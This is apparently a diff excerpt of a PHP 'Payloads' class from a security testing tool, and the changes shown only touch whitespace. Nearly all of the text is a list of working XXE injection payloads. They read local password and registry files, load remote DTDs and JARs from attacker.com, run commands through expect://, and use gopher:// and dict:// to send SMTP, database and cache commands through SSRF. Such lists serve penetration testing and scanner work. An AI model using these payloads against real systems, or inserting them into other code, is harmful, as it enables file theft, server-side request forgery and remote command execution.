         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system.ini\" >]><foo>&xxe;</foo>",
@@ -1705,7 +1704,7 @@ class Payloads
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/software\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/security\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/default\" >]><foo>&xxe;</foo>",
-        
+
         // HTTP XXE
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"https://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
@@ -1717,7 +1716,7 @@ class Payloads
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"sftp://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"scp://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ssh://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
-        
+
         // PHP wrapper XXE
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=config.php\" >]><foo>&xxe;</foo>",
@@ -1725,7 +1724,7 @@ class Payloads
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=config.php\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=admin.php\" >]><foo>&xxe;</foo>",
-        
+
         // Expect wrapper XXE
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://id\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://whoami\" >]><foo>&xxe;</foo>",
@@ -1737,7 +1736,7 @@ class Payloads
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://netstat -an\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://ifconfig\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://ip addr\" >]><foo>&xxe;</foo>",
-        
+
         // Gopher XXE
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:25/_HELO%20attacker.com%0AMAIL%20FROM%3A%3C%3F%0ARCPT%20TO%3A%3Cvictim%40gmail.com%3E%0ADATA%0AFrom%3A%20%3Cattacker%40attacker.com%3E%0ATo%3A%20%3Cvictim%40gmail.com%3E%0ASubject%3A%20test%0A%0Atest%0A.%0AQUIT%0A\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:21/_USER%20anonymous%0APASS%20anonymous%0AQUIT%0A\" >]><foo>&xxe;</foo>",
@@ -1749,7 +1748,7 @@ class Payloads
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:5432/_SELECT%20*%20FROM%20users%0A\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:6379/_GET%20users%0A\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com:27017/_db.users.find()%0A\" >]><foo>&xxe;</foo>",
-        
+
         // Jar XXE
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:http://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:https://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
@@ -1761,7 +1760,7 @@ class Payloads
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:sftp://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:scp://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"jar:ssh://attacker.com/evil.jar!/evil.class\" >]><foo>&xxe;</foo>",
-        
+
         // Netdoc XXE
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.txt\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.xml\" >]><foo>&xxe;</foo>",
@@ -1773,7 +1772,7 @@ class Payloads
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.json\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.yaml\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"netdoc://attacker.com/evil.ini\" >]><foo>&xxe;</foo>",
-        
+
         // Dict XXE
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/stat\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/version\" >]><foo>&xxe;</foo>",
@@ -1785,7 +1784,7 @@ class Payloads
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/evictions\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/reclaimed\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com:11211/cas_misses\" >]><foo>&xxe;</foo>",
-        
+
         // LDAP XXE
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.dtd\" >]><foo>&xxe;</foo>",
@@ -1797,7 +1796,7 @@ class Payloads
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.json\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.yaml\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com:1389/evil.ini\" >]><foo>&xxe;</foo>",
-        
+
         // Alternative encodings
         "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
@@ -1809,7 +1808,7 @@ class Payloads
         "<?xml version=\"1.0\" encoding=\"ISO-8859-5\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-6\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-7\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
-        
+
         // Alternative DOCTYPE declarations
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
@@ -1821,7 +1820,7 @@ class Payloads
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
-        
+
         // Alternative element names
         "<?xml version=\"1.0\"?><!DOCTYPE bar [<!ELEMENT bar ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><bar>&xxe;</bar>",
         "<?xml version=\"1.0\"?><!DOCTYPE baz [<!ELEMENT baz ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><baz>&xxe;</baz>",
@@ -1833,7 +1832,7 @@ class Payloads
         "<?xml version=\"1.0\"?><!DOCTYPE waldo [<!ELEMENT waldo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><waldo>&xxe;</waldo>",
         "<?xml version=\"1.0\"?><!DOCTYPE fred [<!ELEMENT fred ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><fred>&xxe;</fred>",
         "<?xml version=\"1.0\"?><!DOCTYPE plugh [<!ELEMENT plugh ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><plugh>&xxe;</plugh>",
-        
+
         // Alternative entity names
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY evil SYSTEM \"file:///etc/passwd\" >]><foo>&evil;</foo>",
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY hack SYSTEM \"file:///etc/passwd\" >]><foo>&hack;</foo>",
@@ -1925,7 +1924,7 @@ class Payloads
     public static function getByType(string $type): array
     {
         $type = strtolower(str_replace([' ', '-', '_'], '', $type));
-        
+
         switch ($type) {
             case 'sqlinjection':
             case 'sql':
